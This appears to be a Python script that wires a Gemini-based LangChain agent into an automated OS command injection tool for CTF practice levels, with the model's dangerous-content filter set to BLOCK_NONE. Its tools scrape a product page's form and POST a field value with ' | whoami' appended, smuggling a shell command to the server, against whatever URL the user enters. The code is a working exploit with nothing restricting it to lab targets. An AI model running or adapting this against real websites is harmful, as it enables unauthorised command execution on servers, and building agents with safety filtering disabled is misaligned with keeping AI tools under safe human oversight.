from bs4 import BeautifulSoup
import requests
from langchain import hub
from langchain.agents import AgentExecutor, create_react_agent
from langchain.tools import tool
from langchain_google_genai import GoogleGenerativeAI, HarmCategory, HarmBlockThreshold
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup


llm = GoogleGenerativeAI(
    model="gemini-pro",
    temperature=0,
    safety_settings={
        HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT: HarmBlockThreshold.BLOCK_NONE, }
)


@tool("find_product_page_url", return_direct=False)
def find_product_page_url(url):
    """
    OS command injection level start from here. Fetches URL of the product page from a given URL.
    Args:
        url (str): The URL to search for the product page.

    Returns:
        str: The URL of the product page, if found
    """
    # Send a GET request to the URL
    if url.endswith("/"):
        url = url[:-1]
    response = requests.get(url, timeout=20)
    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Parse the HTML content
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find all <a> tags with class "button"
        button_links = soup.find_all('a', class_='button')

        # Check if there are any links
        if button_links:
            # Navigate to the first link
            first_link = button_links[0]

            # Get the URL of the first link
            link_url = url + first_link['href']

            return link_url

@tool("send_cmd_injection", return_direct=False)
def send_cmd_injection(url):
  """
    Fetches product page url and Navigates to that page and retrieves the form tag and extracts payload and fetch its response.

    Args:
        link_url (str): The URL of the Product page.

    Returns:
        List that contains payload and POST url link to fetch the response
  """
  link_url = url
  parsed_url = urlparse(url)
  base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
  link_response = requests.get(link_url, timeout=20)
  if link_response.status_code == 200:
    # Parse the content of the link page
    link_html = link_response.content

    # Parse the HTML content of the link page
    link_soup = BeautifulSoup(link_html, 'html.parser')

    # Find the form tag
    form_tag = link_soup.find('form')
    action = form_tag.get('action')
    # Find all <option> tags
    select_attr = form_tag.find('select').attrs["name"]
    option_value = form_tag.find('option').attrs["value"]
    # Find all child elements of the form
    input_attr = form_tag.find('input').attrs["name"]
    input_value = form_tag.find('input').attrs["value"]
    action_url = base_url + action
    payload = {
      select_attr: option_value,
      input_attr: input_value + " | whoami"
    }
     # Send a POST request to the form action
    response = requests.post(action_url, data=payload, timeout=50)

    # Print out the response status and content
    print("Response Content:", response.text)
    return response.text

tools = [find_product_page_url, send_cmd_injection]

base_prompt = hub.pull("langchain-ai/react-agent-template")
prompt = base_prompt.partial(
    instructions="You are an expert in solving CTF levels. This is OS Command injection levels. Solve this using the url provided by user.")

agent = create_react_agent(llm, tools, prompt)

agent_executor = AgentExecutor(agent=agent, tools=tools, verbose=True)

print("Welcome to my application. I am configured with these tools:")
for tool in agent_executor.tools:
    print(f'  Tool: {tool.name} = {tool.description}')

line = input("llm>> ")
try:
    if line:
        result = agent_executor.invoke({"input": line})
        print(result)
except Exception as e:
    print(e)
